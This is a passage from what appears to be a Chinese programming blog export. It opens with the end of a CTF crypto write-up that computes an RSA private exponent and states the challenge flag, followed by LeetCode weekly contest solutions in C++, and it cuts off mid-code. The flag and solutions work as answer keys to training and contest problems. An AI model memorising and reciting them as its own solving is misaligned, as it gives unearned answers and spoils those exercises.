fai_N <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
k <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> fai_N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> e <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> fai_N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> e
        <span class="token keyword">break</span>
    k <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"d值为："</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span></code></pre>

<p>运行得到结果：125631357777427553，flag即为：cyberpeace{125631357777427553}。</p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>信息安全</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode周赛总结 第276场</title>
    <url>/2022/01/16/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC276%E5%9C%BA/</url>
    <content><![CDATA[<p>本次周赛相对比较简单，前三题花的时间比较短，但无奈最后一题还是没思路。。。</p>
<span id="more"></span>

<h1 id="将字符串拆分成若干长度为-k-的组"><a href="#将字符串拆分成若干长度为-k-的组" class="headerlink" title="将字符串拆分成若干长度为 k 的组"></a>将字符串拆分成若干长度为 k 的组</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/divide-a-string-into-groups-of-size-k/">将字符串拆分成若干长度为 k 的组</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>遍历字符串 s 的每个字符并加入到一个临时字符串中，当此临时字符串长度为 k 时，加入到结果数组中并清空此字符串。若此时遍历到字符串的最后一个字符且此时临时字符串长度没有达到 k 时，则向其末尾填入字符 fill 直到临时字符串长度达到 k，再加入到结果数组中。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">divideString</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">char</span> fill<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        vector<span class="token operator">&lt;</span>string<span class="token operator">></span> res<span class="token punctuation">;</span>
        string newStr<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            newStr <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>newStr<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>newStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
                newStr<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> newStr<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    newStr <span class="token operator">+=</span> fill<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>newStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="得到目标值的最少行动次数"><a href="#得到目标值的最少行动次数" class="headerlink" title="得到目标值的最少行动次数"></a>得到目标值的最少行动次数</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/minimum-moves-to-reach-target-score/">得到目标值的最少行动次数</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>要想行动的次数最少，必然要在数<strong>尽可能大</strong>的情况下使用加倍，但这种思路不好正向模拟，因此考虑模拟该运算的逆过程。</p>
<p>从 target 值开始</p>
<ol>
<li>若该数为奇数，则减 1 之后再除以 2，加倍次数 maxDoubles 减 1，行动次数加 2.</li>
<li>若该数为偶数，则除以 2，加倍次数 maxDoubles 减 1，行动次数加 1.</li>
</ol>
<p>当加倍次数使用完毕，即 maxDoubles 值为 0 时，后面行动全为减 1，因此行动次数直接加上此时的 target - 1.</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">minMoves</span><span class="token punctuation">(</span><span class="token keyword">int</span> target<span class="token punctuation">,</span> <span class="token keyword">int</span> maxDoubles<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>target <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>maxDoubles <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    target<span class="token operator">--</span><span class="token punctuation">;</span>
                    target <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">;</span>
                    maxDoubles<span class="token operator">--</span><span class="token punctuation">;</span>
                    res <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    target <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">;</span>
                    maxDoubles<span class="token operator">--</span><span class="token punctuation">;</span>
                    res<span class="token operator">++</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                res <span class="token operator">+=</span> target <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
                target <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="解决智力问题"><a href="#解决智力问题" class="headerlink" title="解决智力问题"></a>解决智力问题</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/solving-questions-with-brainpower/">解决智力问题</a></p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>一个典型的动态规划问题，可将整个问题分解成一系列等价的子问题。首先确定最后一个问题单独出现时的最优解，然后逐个在该问题之前添加问题，该问题可以选择解或者不解：</p>
<ol>
<li>若解，则此时结果为 <code>questions[i][0] + dp[i + questions[i][1] + 1]</code>（<code>dp[i]</code> 为子问题 i ~ n 的解）。</li>
<li>若不解，则此时结果与不加入此问题时相同，为 <code>dp[i + 1]</code>。</li>
</ol>
<p>分别计算两种情况下的值，取更大的作为最优解。需要注意的是，<code>dp[i + questions[i][1] + 1]</code> 可能会导致数组越界，因此需要先进行判断。</p>
<p>按此方法依次迭代，最终得到原问题的最优解。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">mostPoints</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> questions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span>questions<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dp<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> questions<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> questions<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>questions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> dp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>questions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> questions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>questions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="同时运行-N-台电脑的最长时间"><a href="#同时运行-N-台电脑的最长时间" class="headerlink" title="同时运行 N 台电脑的最长时间"></a>同时运行 N 台电脑的最长时间</h1><h2 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/maximum-running-time-of-n-computers/">同时运行 N 台电脑的最长时间</a></p>
<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接根据条件求解答案比较困难，因此考虑使用二分答案法，在所以可能的结果之间进行二分查找，每次查找完后验证是否符合条件。若符合，则 <code>l = mid + 1</code>；若不符合，<code>r = mid</code>. 最终找到第一个不符合条件的结果，它减一也就是符合条件的最大结果。</p>
<p>那么问题的关键在于如何确定某个数 t 是否符合条件。假设该数为 t，即所有电脑需要同时运行 t 分钟，因为一个电池只能同时给一台电脑供电，因此一个电池可供电的最长时间将会受到 t 的限制，因此一个电池的可供电的最长时间为 <code>min(t, batteries[i])</code>。根据这个条件，我们可以求出所有电池可供电的最长时间的总和 S，最后判断 S 是否大于等于 n * t 来得到该值是否符合条件。</p>
<p>为什么可以直接根据 S 和 n * t 的大小关系进行判断呢？我们可以将 N 台电脑的供电过程想象成一个串行的过程，先使用若干电池给第一台电脑供电，然后继续使用其它电池给第二台电脑供电，以此类推。事实上，各电脑的供电过程是并行的，而我们刚刚的电池分配方案间并不会冲突，因此是可行的。 </p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">maxRunTime</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> batteries<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> canRun <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">long</span> <span class="token keyword">long</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> battery <span class="token operator">:</span> batteries<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                sum <span class="token operator">+=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>battery<span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> sum <span class="token operator">/</span> t <span class="token operator">>=</span> n<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token keyword">long</span> <span class="token keyword">long</span> sumBat <span class="token operator">=</span> <span class="token function">accumulate</span><span class="token punctuation">(</span>batteries<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> batteries<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> l <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> r <span class="token operator">=</span> sumBat <span class="token operator">/</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">long</span> <span class="token keyword">long</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">canRun</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
                l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                r <span class="token operator">=</span> mid<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode周赛总结 第277场</title>
    <url>/2022/01/23/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC277%E5%9C%BA/</url>
    <content><![CDATA[<p>本次周赛没想到比上周还要简单，前三题都可以用非常简单的方法快速解决，第四题如果想对了方向其实也比较简单。</p>
<span id="more"></span>

<h1 id="元素计数"><a href="#元素计数" class="headerlink" title="元素计数"></a>元素计数</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/count-elements-with-strictly-smaller-and-greater-elements/">元素计数</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>相当基础的题目，要同时具有一个严格较小元素和一个严格较大元素，只需要保证这个数 num 满足 <code>num &gt; minVal &amp;&amp; num &lt; maxVal</code>即可。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">countElements</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> minVal <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> maxVal <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            minVal <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>minVal<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            maxVal <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxVal<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> minVal <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> maxVal<span class="token punctuation">)</span>
                res<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="按符号重排数组"><a href="#按符号重排数组" class="headerlink" title="按符号重排数组"></a>按符号重排数组</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/rearrange-array-elements-by-sign/">按符号重排数组</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>最容易想到和实现的方法显然是将正数和负数分别存入两个数组，再合并到一个数组中，虽然这样做空间复杂度比较高，但思路最为简单，代码实现相对较快。</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">rearrangeArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> posVec<span class="token punctuation">;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> negVec<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
                posVec<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
                negVec<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> posVec<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>posVec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>negVec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="找出数组中的所有孤独数字"><a href="#找出数组中的所有孤独数字" class="headerlink" title="找出数组中的所有孤独数字"></a>找出数组中的所有孤独数字</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/find-all-lonely-numbers-in-the-array/">找出数组中的所有孤独数字</a></p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>对数字进行统计，考虑使用哈希表 HashMap 存储数组的数据，哈希表的 key 为数组中的数字，value 为该数字出现的次数。</p>
<p>再次遍历数组，对数组的每一个元素 num 判断 <code>HashMap[num]</code> 是否为 1，并且 <code>HashMap[num - 1]</code> 和 <code>HashMap[num + 1]</code> 是否存在，若都满足，则该数字为孤独数字，加入结果中。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">findLonely</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> numsMap<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            numsMap<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>numsMap<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
